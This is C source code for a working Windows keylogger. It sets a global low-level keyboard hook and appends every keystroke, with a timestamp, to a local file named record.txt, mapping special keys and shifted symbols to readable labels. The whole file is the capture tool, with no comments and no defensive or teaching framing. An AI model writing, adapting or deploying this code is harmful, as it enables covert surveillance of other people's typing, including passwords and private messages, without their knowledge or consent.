#include <stdio.h>
#include <windows.h>
#include <ctype.h>
#include <time.h>
#include <stdlib.h>

HHOOK hook;

LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam);

int special[10] = {41, 33, 64, 35, 36, 37, 46, 38, 42, 40};

int main(){
	MSG msg;

	hook = SetWindowsHookExA(WH_KEYBOARD_LL, funcHook, NULL, 0);
	if (hook == NULL){
		printf("%s\n", "Erro!\n");
		return 1;
	}

	while (GetMessage(&msg, NULL, 0, 0) != 0){
		TranslateMessage(&msg);
		DispatchMessage(&msg);

	}
	UnhookWindowsHookEx(hook);
}


LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam){
	char ch;
	bool flag = false;

	FILE *file = fopen("record.txt", "a+");
	PKBDLLHOOKSTRUCT kbDllHook = (PKBDLLHOOKSTRUCT)lParam;

	if (wParam==WM_KEYDOWN && codigo == HC_ACTION){

		if (!GetAsyncKeyState(VK_SHIFT) && isalpha(kbDllHook->vkCode) == 1){
			ch = kbDllHook->vkCode + 32;
		}

		else {
			if (GetAsyncKeyState(VK_SHIFT) && isdigit(kbDllHook->vkCode)){
					ch = special[kbDllHook->vkCode - 48];
					flag = true;
			}
			else { 
				ch = kbDllHook->vkCode; 	   				
			}
		}


		time_t now;
		time(&now);
		struct tm *local = localtime(&now);	
		fprintf(file, "[%02d/%02d/%d - %02d:%02d:%02d] ", 
									local->tm_mday, local->tm_mon + 1, local->tm_year - 100, 
									local->tm_hour, local->tm_min, local->tm_sec);
		
		
		if (flag) {
			fprintf(file, "%3c\n", ch);
		} else {
			if (ch == 32) fprintf(file, "%3s", "[SPACE]\n");
		
			else if (ch == -112) fprintf(file, "[NumLK]\n");
			else if (ch == 45) fprintf(file, "%3s", "[Insert]\n");
			else if (ch == 46) fprintf(file, "%3s", "[Delete]\n");
			else if (ch == 36) fprintf(file, "%3s", "[Home]\n");
			else if (ch == 33) fprintf(file, "%3s", "[PageUp]\n");
			else if (ch == 34) fprintf(file, "%3s", "[PageDn]\n");
			else if (ch == 35) fprintf(file, "%3s", "[End]\n");
			

			else if (ch == -94) fprintf(file, "%3s", "[CTRL]\n");
			else if (ch == 91) fprintf(file, "%3s", "[WIN]\n");
			else if (ch == 8) fprintf(file, "%3s", "[BACKSPACE]\n");	      
			else if (ch == 9) fprintf(file, "%3s", "[TAB]\n");
			else if (ch == 13) fprintf(file, "%3s", "[ENTER]\n");
			else if (ch == 20) fprintf(file, "%3s", "[CAPSLOCK]\n");
			else if (ch == 44) fprintf(file, "%3s", "[PRINT]\n");

			else if (ch == -34) fprintf(file, "%3s\n", "~ or ^\n");
			else if (ch == -35) fprintf(file, "%3s\n", "[ or {\n");
			else if (ch == -36) fprintf(file, "%3s\n", "] or }\n");
			else if (ch == -37) fprintf(file, "%c or %c\n", 96, 180);	
			else if (ch == -70) fprintf(file, "%3c\n", 231);

			else if (ch == -63) fprintf(file, "%3s\n", "? or /\n");
			else if (ch == -64) fprintf(file, "%3s\n", "\" or \'\n");
			else if (ch == -65) fprintf(file, "%3s\n", ": or ;\n");
			else if (ch == -66) fprintf(file, "%3s\n", ". or >\n");
			else if (ch == -67) fprintf(file, "%3s\n", "- or _\n");
			else if (ch == -68) fprintf(file, "%3s\n", ", or <\n");
			else if (ch == -69) fprintf(file, "%3s\n", "+ or =\n");
			else if (ch == -95 || ch == -96) fprintf(file, "%3s\n", "");
			
			else if (ch == 37) fprintf(file, "%3s\n", "Arrow Left\n");
			else if (ch == 38) fprintf(file, "%3s\n", "Arrow Up\n");
			else if (ch == 39) fprintf(file, "%3s\n", "Arrow Right\n");
			else if (ch == 40) fprintf(file, "%3s\n", "Arrow Down\n");
				
			else {
				fprintf(file, "%3c\n", ch);
			}
		}
	}

	fclose(file);
	return(CallNextHookEx(hook, codigo, wParam, lParam));
}
